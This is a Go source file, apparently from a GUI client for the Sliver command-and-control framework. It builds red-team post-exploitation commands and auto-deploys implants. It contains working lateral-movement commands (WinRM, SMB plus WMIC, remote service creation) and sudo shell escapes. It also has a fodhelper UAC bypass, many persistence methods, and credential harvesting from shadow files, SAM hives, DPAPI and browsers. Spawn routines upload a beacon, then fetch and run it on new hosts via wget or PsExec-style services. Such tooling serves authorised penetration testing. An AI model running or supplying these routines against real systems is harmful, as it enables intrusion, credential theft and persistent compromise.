		host := get("targetHost", "192.168.50.20")
		user := get("user", "Administrator")
		cmd := get("command", "whoami; hostname")
		fmt.Fprintf(&sb, "Execute on pivot via WinRM (PowerShell Remoting) on %s:\n", host)
		fmt.Fprintf(&sb, "  powershell -ExecutionPolicy Bypass -Command \"$sec = ConvertTo-SecureString '<pass>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('%s', $sec); Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s }\"\n", user, host, cmd)

	case "ScriptSCDeploy":
		host := get("targetHost", "192.168.50.20")
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot to create and start remote service on %s:\n", host)
		fmt.Fprintf(&sb, "  sc \\\\%s create SvcXXXX binpath= \"%s\" start= auto &\n", host, beacon)
		fmt.Fprintf(&sb, "  sc \\\\%s start SvcXXXX\n", host)

	case "ScriptSMBUploadExec":
		host := get("targetHost", "192.168.50.20")
		user := get("user", "Administrator")
		beacon := get("beaconPath", `C:\Windows\Temp\update.exe`)
		fmt.Fprintf(&sb, "Execute on pivot to upload via SMB and execute on %s:\n", host)
		fmt.Fprintf(&sb, "  net use \\\\%s\\C$ \"<password>\" /user:%s &\n", host, user)
		fmt.Fprintf(&sb, "  copy /Y \"%s\" \"\\\\%s\\C$\\Windows\\Temp\\update.exe\" &\n", beacon, host)
		fmt.Fprintf(&sb, "  wmic /node:\"%s\" /user:\"%s\" /password:\"<password>\" process call create \"C:\\Windows\\Temp\\update.exe\"\n", host, user)

	case "ScriptPrivescCheck":
		sb.WriteString("Execute Linux privilege escalation check commands on pivot session:\n")
		sb.WriteString("  echo '=== Current User ===' && id ;\n")
		sb.WriteString("  echo '=== Sudo Permissions ===' && sudo -l 2>/dev/null || echo 'no sudo' ;\n")
		sb.WriteString("  echo '=== SUID Binaries ===' && find / -perm -u=s -type f 2>/dev/null | head -20 ;\n")
		sb.WriteString("  echo '=== Writable /etc/crontab ===' && ls -la /etc/crontab 2>/dev/null ;\n")
		sb.WriteString("  echo '=== World-writable dirs ===' && find / -writable -type d 2>/dev/null | grep -v proc | head -10\n")

	case "ScriptSudoExploit":
		m := get("method", "find")
		var cmd string
		switch m {
		case "find":
			cmd = "sudo find / -exec /bin/bash -p \\; -quit"
		case "vim":
			cmd = "sudo vim -c ':!/bin/bash' -c ':q!'"
		case "awk":
			cmd = "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
		}
		fmt.Fprintf(&sb, "Execute sudo exploit (%s) on pivot session:\n  %s -c 'id && whoami'\n", m, cmd)

	case "ScriptWinPrivescCheck":
		sb.WriteString("Execute Windows privilege escalation checks on pivot session:\n")
		sb.WriteString("  whoami /priv &\n")
		sb.WriteString("  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated &\n")
		sb.WriteString("  wmic service get name,pathname,startmode &\n")
		sb.WriteString("  sc query state= all &\n")
		sb.WriteString("  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword &\n")
		sb.WriteString("  schtasks /query /fo LIST /v\n")

	case "ScriptTokenImpersonate":
		user := get("targetUser", "")
		if user == "" {
			sb.WriteString("Execute query on pivot session:\n  whoami /all & tasklist /V\n")
		} else {
			fmt.Fprintf(&sb, "RPC Impersonate user on pivot session:\n  Username: %s\n", user)
		}

	case "ScriptGetSystem":
		prof := get("profile", "my-profile")
		fmt.Fprintf(&sb, "RPC GetSystem on pivot session:\n  HostingProcess: spoolsv.exe\n  Implant Profile: %s\n", prof)

	case "ScriptUACBypass":
		path := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		sb.WriteString("Execute UAC Bypass commands (fodhelper method) on pivot session:\n")
		fmt.Fprintf(&sb, "  reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"%s\" /f &\n", path)
		sb.WriteString("  reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f &\n")
		sb.WriteString("  start fodhelper.exe &\n")
		sb.WriteString("  reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f\n")

	case "ScriptPersistCron":
		cron := get("cronLine", "*/10 * * * * root /tmp/.svc")
		fmt.Fprintf(&sb, "Execute on pivot session to add cron persistence:\n  echo '%s' >> /etc/crontab && echo 'Cron added'\n", cron)

	case "ScriptPersistSSHKey":
		key := get("pubKey", "ssh-rsa AAAA...")
		user := get("targetUser", "root")
		home := "/root"
		if user != "root" {
			home = "/home/" + user
		}
		fmt.Fprintf(&sb, "Execute on pivot session to inject SSH key for %s:\n  mkdir -p %s/.ssh && echo '%s' >> %s/.ssh/authorized_keys && chmod 600 %s/.ssh/authorized_keys\n", user, home, key, home, home)

	case "ScriptPersistSystemd":
		svc := get("serviceName", "system-update")
		exec := get("execPath", "/tmp/.svc")
		fmt.Fprintf(&sb, "Execute on pivot session to create systemd service '%s':\n", svc)
		fmt.Fprintf(&sb, "  Create /etc/systemd/system/%s.service (ExecStart=%s)\n", svc, exec)
		fmt.Fprintf(&sb, "  systemctl daemon-reload && systemctl enable %s\n", svc)

	case "ScriptPersistRegRun":
		name := get("name", "SecurityUpdate")
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot session to add Registry Run key:\n  reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /t REG_SZ /d \"%s\" /f\n", name, beacon)

	case "ScriptPersistSchedTask":
		task := get("taskName", `\Microsoft\Windows\Maintenance\SecurityUpdate`)
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot session to create scheduled task:\n  schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /f\n", task, beacon)

	case "ScriptPersistService":
		svc := get("svcName", "WinUpdateSvc")
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot session to install Windows service '%s':\n", svc)
		fmt.Fprintf(&sb, "  sc create %s binpath= \"%s\" start= auto &\n", svc, beacon)
		fmt.Fprintf(&sb, "  sc description %s \"Windows Update Service\" &\n", svc)
		fmt.Fprintf(&sb, "  sc start %s\n", svc)

	case "ScriptPersistWMI":
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		sb.WriteString("Execute PowerShell WMI Event Subscription persistence on pivot session:\n")
		fmt.Fprintf(&sb, "  Set-WmiInstance __EventFilter ('SliverFilter') & Set-WmiInstance CommandLineEventConsumer ('SliverConsumer' -> '%s') & Set-WmiInstance __FilterToConsumerBinding\n", beacon)

	case "ScriptPersistStartup":
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot session to drop beacon in Startup folder:\n  copy /Y \"%s\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"\n", beacon)

	case "ScriptHarvestCreds":
		sb.WriteString("Execute Linux credential harvest on pivot session:\n")
		sb.WriteString("  Search /etc/shadow, id_rsa, id_ed25519, .bash_history, .env, .conf, .git-credentials, .aws/credentials\n")
		sb.WriteString("  [Loot Routing Enabled]: Harvested output will automatically be stored in Teamserver Loot as 'harvest-linux-XXXX.txt'\n")

	case "ScriptWinHarvestCreds":
		sb.WriteString("Execute Windows credential harvest on pivot session:\n")
		sb.WriteString("  cmdkey /list, SAM/SYSTEM hive save to C:\\Windows\\Temp\\*.bak, netsh wlan, AutoLogon, DPAPI master keys, Chrome Login Data, unattend.xml\n")
		sb.WriteString("  [Loot Routing Enabled]: Harvested output will automatically be stored in Teamserver Loot as 'harvest-windows-XXXX.txt'\n")

	case "ScriptKerberoast":
		sb.WriteString("Execute Kerberoasting PowerShell script on pivot session:\n")
		sb.WriteString("  Query AD SPNs and request Kerberos TGS tickets for offline cracking\n")
		sb.WriteString("  [Loot Routing Enabled]: Harvested tickets/output will automatically be stored in Teamserver Loot as 'kerberoast-XXXX.txt'\n")

	case "ScriptDCSync":
		sb.WriteString("Execute DCSync guidance / domain controller check on pivot session:\n")
		sb.WriteString("  Check Domain Controller accessibility and print mimikatz/secretsdump commands\n")
		sb.WriteString("  [Loot Routing Enabled]: Output will automatically be stored in Teamserver Loot as 'dcsync-XXXX.txt'\n")

	case "ScriptNetworkScan":
		subnet := get("subnet", "192.168.50")
		ports := get("ports", "22 80 443 445 3306 2375 3000 8080")
		fmt.Fprintf(&sb, "Execute Bash /dev/tcp port scan on pivot session:\n  Subnet: %s.1-254\n  Ports: %s\n", subnet, ports)

	case "ScriptADEnum":
		sb.WriteString("Execute Active Directory enumeration checks on pivot session:\n")
		sb.WriteString("  USERDOMAIN, net group \"Domain Admins\", net user /domain, net group \"Domain Computers\", nltest /domain_trusts, gpresult, setspn\n")

	case "ScriptWinLocalEnum":
		sb.WriteString("Execute local Windows enumeration checks on pivot session:\n")
		sb.WriteString("  systeminfo, whoami /all, net localgroup Administrators, ipconfig /all, netstat -ano, net start, AntiVirusProduct, firewall\n")

	default:
		return ScriptResult{Error: "Unknown script: " + method}
	}

	return ScriptResult{
		Success: true,
		Output:  sb.String(),
	}
}

// ─── Auto-Generate Implants (CS spawn/jump style) ─────────────────────────────

// ScriptSpawnLinux generates a fresh Linux beacon from a listener and deploys via SSH.
// Like CS: "jump ssh <target> <listener>" → new beacon appears.
func (a *App) ScriptSpawnLinux(sessionID, targetHost string, targetPort int, user, pass, listenerURL string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if targetPort == 0 {
		targetPort = 22
	}
	if listenerURL == "" {
		return ScriptResult{Error: "Provide listener C2 URL (e.g. mtls://192.168.50.30:8443 or http://10.10.10.1:8080)"}
	}
	a.audit.log("script-spawn-linux", sessionID, fmt.Sprintf("→ %s@%s via %s", user, targetHost, listenerURL))

	if warn := a.checkListenerPorts([]string{listenerURL}); warn != "" {
		return ScriptResult{Error: warn}
	}

	// Generate a fresh implant
	implantData, implantName, err := a.autoGenerate("linux", "amd64", listenerURL, true)
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("generation failed: %v", err)}
	}

	// Upload to pivot
	remotePath := "/tmp/." + implantName
	if _, err := client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path: remotePath, Data: implantData, IsIOC: false,
		Request: &commonpb.Request{SessionID: sessionID},
	}); err != nil {
		return ScriptResult{Error: fmt.Sprintf("upload to pivot failed: %v", err)}
	}
	_, _ = client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
		Path: remotePath, FileMode: "0755",
		Request: &commonpb.Request{SessionID: sessionID},
	})

	// Serve from pivot
	pivotIP, iperr := a.getPivotInternalIP(sessionID)
	if iperr != nil {
		return ScriptResult{Error: fmt.Sprintf("cannot determine pivot IP: %v", iperr)}
	}
	httpPort := pivotHTTPPort()
	_, _ = a.executeShellCmd(sessionID, pivotServeCmd(httpPort))
	time.Sleep(2 * time.Second)

	// SSH to target: download + run
	deployCmd := fmt.Sprintf("wget -q http://%s:%d/%s -O /tmp/.%s && chmod +x /tmp/.%s && /tmp/.%s &",
		pivotIP, httpPort, implantName, implantName, implantName, implantName)

	resp, err := client.RPC.RunSSHCommand(a.ctx, &sliverpb.SSHCommandReq{
		Username: user, Hostname: targetHost, Port: uint32(targetPort),
		Password: pass, Command: deployCmd,
		Request: &commonpb.Request{SessionID: sessionID},
	})

	out := ""
	if resp != nil {
		out = resp.StdOut + resp.StdErr
	}
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("deploy failed: %v\n%s", err, out)}
	}
	return ScriptResult{Success: true, Output: fmt.Sprintf("[+] Spawned beacon on %s@%s\n[+] C2: %s\n[+] A new beacon will appear in the GUI shortly.\n%s", user, targetHost, listenerURL, out)}
}

// ScriptSpawnWindows generates a fresh Windows beacon and deploys via PsExec-style.
// Like CS: "jump psexec64 <target> <listener>" → new beacon appears.
func (a *App) ScriptSpawnWindows(sessionID, targetHost string, targetPort int, user, pass, listenerURL string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	if listenerURL == "" {
		return ScriptResult{Error: "Provide listener C2 URL (e.g. mtls://10.10.10.1:8443 or http://10.10.10.1:8080)"}
	}
	a.audit.log("script-spawn-windows", sessionID, fmt.Sprintf("→ %s@%s via %s", user, targetHost, listenerURL))

	if warn := a.checkListenerPorts([]string{listenerURL}); warn != "" {
		return ScriptResult{Error: warn}
	}

	// Generate a fresh Windows implant
	implantData, implantName, err := a.autoGenerate("windows", "amd64", listenerURL, true)
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("generation failed: %v", err)}
	}

	// Upload to current session (the pivot)
	localRemote := `C:\Windows\Temp\` + implantName + ".exe"
	if _, err := client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path: localRemote, Data: implantData, IsIOC: false,
		Request: &commonpb.Request{SessionID: sessionID},
	}); err != nil {
		return ScriptResult{Error: fmt.Sprintf("upload to pivot failed: %v", err)}
	}

	// Copy to target via SMB + create service + start
	targetRemote := `C:\Windows\Temp\` + implantName + ".exe"
	svcName := "Svc" + implantName[:6]
	cmds := []string{
		fmt.Sprintf(`net use \\%s\C$ /user:"%s" "%s"`, targetHost, user, pass),
		fmt.Sprintf(`copy /Y "%s" "\\%s\C$\Windows\Temp\%s.exe"`, localRemote, targetHost, implantName),
		fmt.Sprintf(`sc \\%s create %s binpath= "%s" start= demand`, targetHost, svcName, targetRemote),
		fmt.Sprintf(`sc \\%s start %s`, targetHost, svcName),
	}
	output, ferr := a.executeShellCmd(sessionID, strings.Join(cmds, " & "))
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}

	return ScriptResult{Success: true, Output: fmt.Sprintf("[+] Spawned on %s via PsExec\n[+] Service: %s\n[+] C2: %s\n[+] New beacon incoming...\n%s", targetHost, svcName, listenerURL, output)}
}

// checkListenerPorts returns a human-readable warning if none of the given C2
// URLs have a matching running listener port on the teamserver. Empty string
// means a viable listener is up (or we couldn't resolve any port, in which case
// we do not block). This is what turns a silent no-show spawn into an actionable
// error instead of "will appear shortly" for an implant that can never check in.
func (a *App) checkListenerPorts(c2URLs []string) string {
	client, err := a.requireClient()
	if err != nil {
		return err.Error()
	}
	jobs, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return "" // can't list jobs — don't block the spawn on our own check
	}

	livePorts := map[uint32]bool{}
	var have []string
	for _, j := range jobs.Active {
		if j.Port != 0 {
			livePorts[j.Port] = true
		}
		have = append(have, fmt.Sprintf("%s:%d", strings.ToLower(j.Name), j.Port))
	}

	// Match by port (the strongest signal — e.g. a C2 on :31337 with no listener
	// there). Only warn when we positively know no port matches.
	var wanted []string
	sawPort := false
	for _, cu := range c2URLs {
		u, perr := url.Parse(cu)
		if perr != nil || u.Port() == "" {
			continue
		}
		p64, cerr := strconv.ParseUint(u.Port(), 10, 32)
		if cerr != nil {
			continue
		}
		sawPort = true
		wanted = append(wanted, cu)
		if livePorts[uint32(p64)] {
			return "" // a listener is bound on this C2 port
		}
	}
	if !sawPort {
		return "" // couldn't resolve any port — don't block
	}
	return fmt.Sprintf(
		"target C2 %s but no listener is running on that port.\nActive listeners: %s.\nStart a matching listener (Listeners panel, or e.g. `mtls <port>` in the server console) or use a C2 that matches a live listener.",
		strings.Join(wanted, ", "), strings.Join(have, ", "))
}

// checkProfileListener is the profile-name form of checkListenerPorts: it loads
// the profile and checks all of its C2 endpoints.
func (a *App) checkProfileListener(profileName string) string {
	config, err := a.profileConfig(profileName)
	if err != nil {
		return fmt.Sprintf("failed to load profile '%s': %v", profileName, err)
	}
	var urls []string
	for _, c2 := range config.C2 {
		urls = append(urls, c2.URL)
	}
	return a.checkListenerPorts(urls)
}

// autoGenerate builds a fresh implant. profileOrURL may be EITHER a saved
// profile name (resolved via profileConfig) OR a raw C2 URL like
// "mtls://10.10.10.1:8443" (built directly). The URL form is what the remote
// spawn recipes (ScriptSpawnLinux/Windows) pass; the profile form is what the
// local spawn passes.
func (a *App) autoGenerate(osTarget, arch, profileOrURL string, isBeacon bool) ([]byte, string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, "", err
	}

	if profileOrURL == "" {
		return nil, "", fmt.Errorf("a profile name or C2 URL is required")
	}

	var config *clientpb.ImplantConfig
	if strings.Contains(profileOrURL, "://") {
		// Raw C2 URL — build a config directly (no saved profile needed).
		config = a.buildImplantConfig(GenerateRequest{
			GOOS:   osTarget,
			GOARCH: arch,
			Format: "exe",
			C2URL:  profileOrURL,
			Beacon: isBeacon,
		})
	} else {
		config, err = a.profileConfig(profileOrURL)
		if err != nil {
			return nil, "", fmt.Errorf("failed to load profile '%s': %v", profileOrURL, err)
		}
	}

	// Override the OS/Arch based on what the user requested via spawn
	if osTarget != "" {
		config.GOOS = osTarget
	}
	if arch != "" {
		config.GOARCH = arch
	}
	config.IsBeacon = isBeacon
	if isBeacon && config.BeaconInterval <= 0 {
		// A profile built for session mode has no interval; forcing beacon mode
		// without one yields a 0s-interval beacon that never schedules a check-in
		// (queued commands like `interactive`/`pwd` never run). Default to 60s.
		config.BeaconInterval = 60 * int64(time.Second)
	}
	config.Format = clientpb.OutputFormat_EXECUTABLE

	generated, err := client.RPC.Generate(a.ctx, &clientpb.GenerateReq{Config: config})
	if err != nil {
		return nil, "", fmt.Errorf("generate from '%s' failed: %v", profileOrURL, err)
	}
	if generated.File == nil || len(generated.File.Data) == 0 {
		return nil, "", fmt.Errorf("generate returned empty implant (source: %s)", profileOrURL)
	}

	implantName := fmt.Sprintf("spawn_%d", time.Now().UnixNano()%1000000)
	return generated.File.Data, implantName, nil
}

// ─── Spawn (local — like CS "spawn x64 http") ────────────────────────────────

// ScriptSpawnLocal generates a new implant and runs it on the CURRENT session's host.
// No credentials needed — you already have access. Gets you a second callback
// on a different listener/protocol.
//
// Usage from console: spawn <os> <arch> <profile_name>
//
//	spawn windows x64 my-http-profile
//	spawn linux x64 my-mtls-profile
func (a *App) ScriptSpawnLocal(sessionID, targetOS, arch, profileName string) ScriptResult {
	client, err := a.requireClient()
	if err != nil {
		return ScriptResult{Error: err.Error()}
	}
	a.audit.log("script-spawn-local", sessionID, fmt.Sprintf("%s/%s %s", targetOS, arch, profileName))

	if _, serr := a.requireSession(sessionID); serr != nil {
		return ScriptResult{Error: serr.Error()}
	}

	if profileName == "" {
		return ScriptResult{Error: "Profile name required.\n\nCreate a profile first:\n  1. GUI → Profiles panel → Create\n  2. Or Server console: profiles new --mtls 10.10.10.1:8443 --os windows --arch amd64 --beacon --name my-profile\n\nThen: spawn windows x64 my-profile"}
	}

	// Resolve OS
	if targetOS == "" {
		targetOS = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}
	switch arch {
	case "x64", "64":
		arch = "amd64"
	case "x86", "32":
		arch = "386"
	}

	// Pre-flight: make sure the profile's C2 actually has a live listener behind
	// it. Without this the implant is happily generated + run but silently never
	// checks in (dead port, or a stale server with a mismatched CA → the beacon
	// gets "x509: certificate signed by unknown authority" and never appears).
	if warn := a.checkProfileListener(profileName); warn != "" {
		return ScriptResult{Error: warn}
	}

	// Generate the implant from the profile
	implantData, implantName, err := a.autoGenerate(targetOS, arch, profileName, true)
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("generation failed: %v", err)}
	}

	// Upload to the current session
	var remotePath string
	if targetOS == "windows" {
		remotePath = `C:\Windows\Temp\` + implantName + ".exe"
	} else {
		remotePath = "/tmp/." + implantName
	}

	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    remotePath,
		Data:    implantData,
		IsIOC:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("upload failed: %v", err)}
	}

	// Make executable (Linux)
	if targetOS != "windows" {
		_, _ = client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
			Path: remotePath, FileMode: "0755",
			Request: &commonpb.Request{SessionID: sessionID},
		})
	}

	// Execute it
	var execPath string
	var execArgs []string
	if targetOS == "windows" {
		execPath = remotePath
		execArgs = []string{}
	} else {
		execPath = "/bin/sh"
		execArgs = []string{"-c", remotePath + " &"}
	}

	// Snapshot existing agents so we can detect the new one after execution.
	before := a.snapshotAgentIDs()

	_, err = client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    execPath,
		Args:    execArgs,
		Output:  false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ScriptResult{Error: fmt.Sprintf("execution failed: %v", err)}
	}

	a.UpdateKillChain("access")
	if sess, e := a.requireSession(sessionID); e == nil {
		a.AddIOC(sess.Hostname, "file", remotePath, fmt.Sprintf("Spawned %s/%s (%s)", targetOS, arch, profileName))
	}

	// Verify it actually checked in rather than claiming "will appear shortly".
	newAgent := a.waitForNewAgent(before, 12*time.Second)
	if newAgent != "" {
		return ScriptResult{
			Success: true,
			Output: fmt.Sprintf("[+] Spawned %s/%s from profile '%s'\n[+] Path: %s\n[+] Checked in: %s",
				targetOS, arch, profileName, remotePath, newAgent),
		}
	}
	return ScriptResult{
		Success: true,
		Output: fmt.Sprintf("[+] Spawned %s/%s from profile '%s'\n[+] Path: %s\n[!] No check-in within 12s. If this profile is a beacon, wait for its check-in interval. Otherwise verify the listener is up and matches the profile's C2, and that AV isn't blocking the implant.",
			targetOS, arch, profileName, remotePath),
	}
}

// findListenerURL finds a running listener of the given type and returns its C2 URL.
//
//nolint:unused // helper for upcoming spawn/jump flows that build against a live listener
func (a *App) findListenerURL(listenerType string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}

	jobs, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return "", fmt.Errorf("cannot list jobs: %v", err)
	}

	listenerType = strings.ToLower(listenerType)

	for _, job := range jobs.Active {
		jobName := strings.ToLower(job.Name)
		// Match listener type
		matched := false
		switch listenerType {
		case "mtls", "tls":
			matched = strings.Contains(jobName, "mtls") || strings.Contains(jobName, "mutual")
		case "http":
			matched = strings.Contains(jobName, "http") && !strings.Contains(jobName, "https")
		case "https":
			matched = strings.Contains(jobName, "https")
		case "dns":
			matched = strings.Contains(jobName, "dns")
		case "wg", "wireguard":
			matched = strings.Contains(jobName, "wg") || strings.Contains(jobName, "wireguard")
		default:
			// Try exact match
			matched = strings.Contains(jobName, listenerType)
		}

		if matched {
			host := "0.0.0.0"
			port := job.Port
			// Build URL
			proto := listenerType
			if proto == "tls" {
				proto = "mtls"
			}
			return fmt.Sprintf("%s://%s:%d", proto, host, port), nil
		}
	}

	return "", fmt.Errorf("no active '%s' listener found. Start one first (Listeners panel or: mtls/http/https/dns in Server console)", listenerType)
}
